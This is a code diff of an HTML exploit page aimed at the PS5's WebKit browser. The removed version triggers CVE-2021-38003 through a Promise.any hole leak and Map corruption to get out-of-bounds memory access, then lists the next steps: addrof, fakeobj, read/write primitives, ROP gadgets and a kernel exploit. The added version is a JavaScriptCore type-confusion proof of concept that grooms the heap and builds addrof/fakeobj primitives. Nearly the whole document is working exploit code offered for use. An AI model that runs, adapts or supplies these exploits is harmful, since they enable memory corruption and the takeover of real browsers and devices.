@@ -2,203 +2,162 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - CVE-2021-38003 Test</title>
+<title>PS5 - JSC Type Confusion PoC (v63)</title>
 <style>
-body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
+body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 pre { white-space: pre-wrap; word-wrap: break-word; }
-.ok { color: #00ff41 } .er { color: #ff3333 } .hl { color: #00ffff } .mg { color: #ff00ff; font-weight: bold }
 </style>
 </head>
 <body>
-<pre id="o"></pre>
+<pre id="out"></pre>
 <script>
-var o=document.getElementById("o");
-function log(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";o.appendChild(s);o.scrollTop=o.scrollHeight}
+var out = document.getElementById("out");
+function log(m) { out.textContent += m + "\n"; }
 
-log("=== CVE-2021-38003 (Map Hole Leak) Test ===\n","mg");
+log("=== JSC Type Confusion PoC (DarkSword Variant) ===\n");
 
-// Step 1: Check prerequisites
-log("[1] Checking prerequisites...");
+// ============================================================
+//  JSC Exploit Code (Adapted for PS5 WebKit)
+// ============================================================
 
-if (typeof BigInt !== 'function') {
-    log("  ❌ BigInt is NOT available","er");
-    log("  → Cannot proceed without BigInt","er");
-    log("\n=== Test Complete ===","mg");
-} else {
-    log("  ✅ BigInt available","ok");
-}
+arr = new Array(0x40_0000).fill(1.1);
+let arr_index = arr.length - 1;
+let reclaimed = [];
 
-if (typeof BigUint64Array !== 'function') {
-    log("  ❌ BigUint64Array is NOT available","er");
-} else {
-    log("  ✅ BigUint64Array available","ok");
-}
+function foo(flag, k, allocCount) {
+    let A = {
+        p0: 0x41414141,
+        p1: 1.1,
+        p2: 2.2,
+    };
+    arr[arr_index] = A;
 
-if (typeof Promise !== 'undefined' && typeof Promise.any === 'function') {
-    log("  ✅ Promise.any available","ok");
-} else {
-    log("  ❌ Promise.any is NOT available","er");
-    log("  → CVE-2021-38003 cannot be triggered without Promise.any","er");
-    log("\n=== Test Complete ===","mg");
-}
+    let forGC = [];
 
-// Step 2: Try to trigger CVE-2021-38003
-log("\n[2] Attempting to trigger CVE-2021-38003...");
-log("  (This is the exact trigger from Y2JB exploit)\n");
+    let a = new Date(1111);
+    a[0] = 1.1;
 
-function trigger() {
-    let v1;
-    function f0(v4) {
-        v4(() => {}, v5 => {
-            v1 = v5.errors;
-        });
+    for (let j = 0; j < allocCount; ++j) {
+        let arr = new ArrayBuffer(0x80_0000);
+        forGC.push(arr);
     }
-    f0.resolve = function(v6) {
-        return v6;
+
+    A.p2 = forGC;
+    let b = {
+        p0: 0x42424242,
+        p1: 1.1,
     };
-    let v3 = {
-        then(v7, v8) {
-            v8();
+
+    let f;
+    f = b;
+    if (flag) {
+        f = 1.1;
+    }
+
+    A.p1 = f;
+    let v = 1.1;
+    for (let i = 0; i < 1e6; ++i) {
+        for (let j = 0; j < k; ++j) {
+            v = i;
+            v = j;
         }
-    };
-    Promise.any.call(f0, [v3]);
-    return v1[1];
+    }
+    b.p0 = v;
+    b.p1 = a;
 }
 
-var hole = undefined;
-var triggerError = null;
-
-try {
-    hole = trigger();
-} catch(e) {
-    triggerError = e;
+function recursive(n) {
+    if (n === 0)
+        return;
+    n = n | 0;
+    recursive(n - 1);
 }
 
-if (triggerError) {
-    log("  ❌ Trigger threw exception: " + triggerError.message,"er");
-    log("  → Bug is PATCHED or not triggerable","er");
-    log("\n=== Test Complete ===","mg");
-} else if (hole === undefined || hole === null) {
-    log("  ❌ Trigger returned undefined/null","er");
-    log("  → Bug is PATCHED on this browser","er");
-    log("  → v1[1] was not set (Promise.any didn't call reject)","er");
-    log("\n=== Test Complete ===","mg");
-} else {
-    log("  ✅ Trigger returned a value!","ok");
-    log("  → hole type: " + typeof hole,"hl");
-    log("  → hole value: " + String(hole),"hl");
-    log("  → CVE-2021-38003 may be ALIVE!","mg");
-    
-    // Step 3: Try Map corruption
-    log("\n[3] Attempting Map corruption for OOB access...");
-    log("  (This creates an OOB BigUint64Array)\n");
-    
-    try {
-        var map1;
-        var oob_arr;
-        var victim_arr;
-        var obj_arr;
-        
-        // GC pressure (replace gc() calls)
-        log("  [*] Applying GC pressure...");
-        for (var i = 0; i < 200; i++) {
-            new ArrayBuffer(0x100000);
+function main() {
+    log("[*] Warming up JIT...");
+    foo(true, 1, 1);
+    foo(false, 1, 1);
+
+    for (let i = 0; i < 1000; ++i) {
+        foo(false, 0, 0);
+    }
+
+    log("[*] Triggering stack manipulation...");
+    for (let i = 0; i < 10000; i++)
+        recursive(i);
+
+    log("[*] Attempting Type Confusion overlap...");
+    for (let k = 0; k < 10000; ++k) {
+        foo(false, 10, k % 5 + 1);
+        recursive(10000);
+
+        for (let i = 0; i < 3; ++i) {
+            new ArrayBuffer(0x4000);
         }
-        
-        log("  [*] Creating Map corruption pattern (0x10 iterations)...");
-        for (var i = 0; i < 0x10; i++) {
-            map1 = new Map();
-            map1.set(1, 1);
-            map1.set(hole, 1);
-            map1.delete(hole);
-            map1.delete(hole);
-            map1.delete(1);
-            oob_arr = new BigUint64Array([0x4141414141414141n]);
-        }
-        
-        victim_arr = new BigUint64Array([0x4343434343434343n, 0x4343434343434343n]);
-        obj_arr = [{}, {}];
-        
-        log("  [*] Triggering map corruption...");
-        map1.set(0x1e, -1);
-        
-        // More GC pressure
-        for (var i = 0; i < 200; i++) {
-            new ArrayBuffer(0x100000);
-        }
-        
-        map1.set(0x0, 0x1);
-        
-        log("  [*] oob_arr.length: 0x" + oob_arr.length.toString(16),"hl");
-        
-        // Step 4: Check for OOB access
-        log("\n[4] Scanning for OOB access...");
-        log("  (Looking for 0x4141414141414141 or 0x4343434343434343 in OOB range)\n");
-        
-        var found_41 = false;
-        var found_43 = false;
-        var found_other = false;
-        var first_oob_idx = -1;
-        
-        for (var i = 0; i < 200; i++) {
-            try {
-                var val = oob_arr[i];
-                if (val === 0x4141414141414141n) {
-                    if (i >= 1) {
-                        found_41 = true;
-                        log("  [+] Found 0x4141... at oob_arr[" + i + "]","ok");
-                    }
-                } else if (val === 0x4343434343434343n) {
-                    found_43 = true;
-                    if (first_oob_idx === -1) first_oob_idx = i;
-                    log("  [+] Found 0x4343... at oob_arr[" + i + "]","ok");
-                } else if (val !== 0n && val !== undefined) {
-                    if (!found_other) {
-                        found_other = true;
-                        log("  [+] Found non-zero value at oob_arr[" + i + "]: 0x" + val.toString(16),"hl");
-                    }
-                }
-            } catch(e) {
+
+        let freed = arr[arr_index].p1.p1;
+        let noCow = 13.37;
+        let win = false;
+        for (let i = 0; i < 16; ++i) {
+            let arr = [13.37, 2.2, 3.3, 4.4, noCow]; 
+            reclaimed.push(arr);
+            if (freed[0] === 13.37) { 
+                win = true;
                 break;
             }
         }
-        
-        log("");
-        
-        if (found_43 || found_other) {
-            log("★ OOB ACCESS CONFIRMED! ★","mg");
-            log("");
-            log("  → We can read adjacent heap memory!","ok");
-            log("  → victim_arr found at oob_arr[" + first_oob_idx + "]","ok");
-            log("  → Next steps:","hl");
-            log("    1. Build addrof primitive (using obj_arr overlap)","hl");
-            log("    2. Build fakeobj primitive (using victim_arr overlap)","hl");
-            log("    3. Build read64/write64 (using fake ArrayBuffer)","hl");
-            log("    4. Find browser-specific ROP gadgets (NOT YouTube gadgets)","hl");
-            log("    5. Build syscall wrapper","hl");
-            log("    6. Load kernel exploit","hl");
-            log("");
-            log("  NOTE: ROP gadgets from Y2JB are for YouTube (libcobalt)","wr");
-            log("  Browser uses libSceWebKit2 — different addresses!","wr");
-            log("  We need to find new gadgets using read64 once we have it.","wr");
-        } else if (found_41 && !found_43) {
-            log("  ⚠️ Found self-reference but no OOB","wr");
-            log("  → Map corruption may have partially worked","wr");
-            log("  → Need to adjust heap layout","wr");
-        } else {
-            log("  ❌ No OOB access detected","er");
-            log("  → Map corruption did not work","er");
-            log("  → Bug may be partially patched","er");
+
+        if (!win) {
+            continue;
         }
+
+        log("[+] OVERLAP DETECTED! addrof/fakeobj achieved!");
         
-    } catch(e) {
-        log("  ❌ Map corruption failed: " + e.message,"er");
-        log("  → " + (e.stack || "No stack trace"),"er");
+        let boxed_arr = reclaimed[reclaimed.length - 1];
+        boxed_arr[0] = {};
+        let unboxed_arr = freed;
+
+        let ab = new ArrayBuffer(8);
+        let u64 = new BigUint64Array(ab);
+        let f64 = new Float64Array(ab);
+
+        function itof(value) {
+            u64[0] = value;
+            return f64[0];
+        }
+
+        function ftoi(f) {
+            f64[0] = f;
+            return u64[0];
+        }
+
+        function addrof(obj) {
+            boxed_arr[0] = obj;
+            return ftoi(unboxed_arr[0]);
+        }
+
+        function fakeobj(addr) {
+            unboxed_arr[0] = itof(addr);
+            return boxed_arr[0];
+        }
+
+        let testObj = { p0: 1.1 };
+        let addr = addrof(testObj);
+        
+        log("[+] addrof({p0:1.1}) = 0x" + addr.toString(16));
+        log("[+] JSC EXPLOIT SUCCESSFUL!");
+        
+        alert("Success! addrof = 0x" + addr.toString(16));
+        return;
     }
+    log("[-] Overlap failed after 10000 iterations.");
 }
 
-log("\n=== Test Complete ===","mg");
+try {
+    main();
+} catch(e) {
+    log("[-] CRASH: " + e.message);
+}
 </script>
 </body>
 </html>
